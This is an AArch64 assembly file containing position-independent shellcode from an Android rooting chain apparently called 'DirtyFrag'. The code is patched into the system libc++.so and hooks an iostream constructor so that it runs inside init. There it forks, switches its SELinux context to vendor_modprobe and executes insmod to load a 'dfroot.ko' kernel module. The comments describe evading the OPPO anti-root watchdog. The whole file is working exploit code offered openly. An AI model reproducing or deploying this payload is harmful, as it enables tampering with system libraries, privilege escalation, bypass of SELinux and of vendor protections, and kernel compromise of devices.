/*
 * libcxx_payload.S - position-independent AArch64 shellcode blob.
 *
 * Role in the chain (DirtyFrag architecture):
 *   The engine patches this blob into /system/lib64/libc++.so (into a zero
 *   cave inside an executable PT_LOAD) and writes a trampoline over the entry
 *   of
 *     _ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEE6sentryC1ERS3_
 *   (std::basic_ostream<char>::sentry::sentry(std::basic_ostream<char>&)).
 *
 *   Every process that uses iostreams executes it; the uid/tid gate keeps it
 *   inert everywhere except inside init (uid==0, main thread tid==1), so the
 *   privileged work runs in an already-root context - nothing for the OPPO
 *   anti-root watchdog to observe from an app domain.
 *
 * Trigger: a forked orphan is reparented to init; when init reaps it, the
 * hooked sentry ctor runs in init's main thread.
 *
 * Blob contract (all position-independent, ADR-relative, no relocations):
 *   - engine copies the blob into the cave
 *   - engine patches dfsc_ko_path (64-byte slot) with the dfroot.ko path
 *   - engine patches dfsc_displaced_slot with the instruction that was at the
 *     hook site (must not be PC-relative - engine refuses those)
 *   - engine patches dfsc_back_slot with `B (hook_site + 4)`
 *   - engine writes `B (cave)` at the hook site (+4 when PACIASP/BTI present)
 *
 * Note on PACIASP: when the prologue is PACIASP, the hook site is +4 and the
 * prologue has already executed by the time our trampoline runs, so the
 * blob must NOT execute PACIASP again (that would double-sign LR and break
 * the paired AUTIASP in the epilogue).
 */

        .section .rodata.dfsc,"a",@progbits
        .balign 4

        .globl dfsc_blob_start
        .hidden dfsc_blob_start
dfsc_blob_start:
        /* sp must be 16-byte aligned here (entry state of the hooked fn) */

        /* frame: x29,x30 at [sp,#0..15]; save area [sp,#16..175] */
        stp     x29, x30, [sp, #-192]!

        stp     x0,  x1,  [sp, #16]
        stp     x2,  x3,  [sp, #32]
        stp     x4,  x5,  [sp, #48]
        stp     x6,  x7,  [sp, #64]
        stp     x8,  x9,  [sp, #80]
        stp     x10, x11, [sp, #96]
        stp     x12, x13, [sp, #112]
        stp     x14, x15, [sp, #128]
        stp     x16, x17, [sp, #144]
        str     x18,      [sp, #160]
        mrs     x0, nzcv
        str     x0,       [sp, #168]

        /* gate 1: uid == 0 (getuid) */
        mov     w8, #174                 /* __NR_getuid */
        svc     #0
        cbnz    x0, .Ldfsc_done

        /* gate 2: tid == 1 (gettid) - init main thread only */
        mov     w8, #178                 /* __NR_gettid */
        svc     #0
        cmp     x0, #1
        b.ne    .Ldfsc_done

        /* mutex: openat(AT_FDCWD, "/dev/df", O_WRONLY|O_CREAT|O_EXCL, 0600) */
        mov     x0, #-100                /* AT_FDCWD */
        adr     x1, .Ldfsc_mutex
        mov     w2, #0x241               /* O_WRONLY|O_CREAT|O_EXCL */
        mov     w3, #0x180               /* 0600 */
        mov     w8, #56                  /* __NR_openat */
        svc     #0
        cmp     x0, #0
        b.lt    .Ldfsc_done              /* EEXIST / error -> already done */
        mov     w8, #57                  /* __NR_close */
        svc     #0

        /* clone(SIGCHLD, ...) - child does the insmod work */
        mov     x0, #17                  /* SIGCHLD */
        mov     x1, xzr
        mov     x2, xzr
        mov     x3, xzr
        mov     x4, xzr
        mov     w8, #220                 /* __NR_clone */
        svc     #0
        cbnz    x0, .Ldfsc_done          /* parent (or error) -> return */

        /* ---- grandchild: switch SELinux context, then insmod ---- */
        /* openat(AT_FDCWD, "/proc/self/attr/exec", O_WRONLY, 0) */
        mov     x0, #-100
        adr     x1, .Ldfsc_attr
        mov     w2, #1                   /* O_WRONLY */
        mov     x3, xzr
        mov     w8, #56
        svc     #0
        cmp     x0, #0
        b.lt    .Ldfsc_gexit
        /* write(fd, "u:r:vendor_modprobe:s0", 22) */
        adr     x1, .Ldfsc_ctx
        mov     w2, #(.Ldfsc_ctx_end - .Ldfsc_ctx)
        mov     w8, #64                  /* __NR_write */
        svc     #0
        mov     w8, #57                  /* close */
        svc     #0

        /* execve("/vendor/bin/insmod", [insmod, ko_path, NULL], NULL) */
        adr     x0, .Ldfsc_insmod
        adr     x1, dfsc_ko_path
        sub     sp, sp, #32
        stp     x0, x1, [sp]             /* argv[0], argv[1] */
        str     xzr, [sp, #16]           /* argv[2] = NULL */
        adr     x0, .Ldfsc_insmod
        mov     x1, sp
        mov     x2, xzr
        mov     w8, #221                 /* __NR_execve */
        svc     #0
        add     sp, sp, #32              /* exec failed -> fall through */

.Ldfsc_gexit:
        mov     x0, #127
        mov     w8, #93                  /* __NR_exit_group */
        svc     #0

.Ldfsc_done:
        /* restore everything except x0 (used to ferry NZCV back) */
        ldp     x2,  x3,  [sp, #32]
        ldp     x4,  x5,  [sp, #48]
        ldp     x6,  x7,  [sp, #64]
        ldp     x8,  x9,  [sp, #80]
        ldp     x10, x11, [sp, #96]
        ldp     x12, x13, [sp, #112]
        ldp     x14, x15, [sp, #128]
        ldp     x16, x17, [sp, #144]
        ldr     x18,      [sp, #160]
        ldr     x0,       [sp, #168]
        msr     nzcv, x0
        ldp     x0,  x1,  [sp, #16]
        ldp     x29, x30, [sp], #192

        /* displaced instruction (engine-patched, not PC-relative) */
        .globl  dfsc_displaced_slot
        .hidden dfsc_displaced_slot
dfsc_displaced_slot:
        .word   0

        /* branch back to hook_site + 4 (engine-patched B) */
        .globl  dfsc_back_slot
        .hidden dfsc_back_slot
dfsc_back_slot:
        .word   0

.Ldfsc_mutex:
        .asciz  "/dev/df"
.Ldfsc_attr:
        .asciz  "/proc/self/attr/exec"
.Ldfsc_ctx:
        .asciz  "u:r:vendor_modprobe:s0"
.Ldfsc_ctx_end:
.Ldfsc_insmod:
        .asciz  "/vendor/bin/insmod"

        /* 64-byte engine-patchable slot for the dfroot.ko path */
        .globl  dfsc_ko_path
        .hidden dfsc_ko_path
dfsc_ko_path:
        .asciz  "/data/local/tmp/dfroot.ko"
        .space  64 - (. - dfsc_ko_path)

        .globl  dfsc_blob_end
        .hidden dfsc_blob_end
dfsc_blob_end:
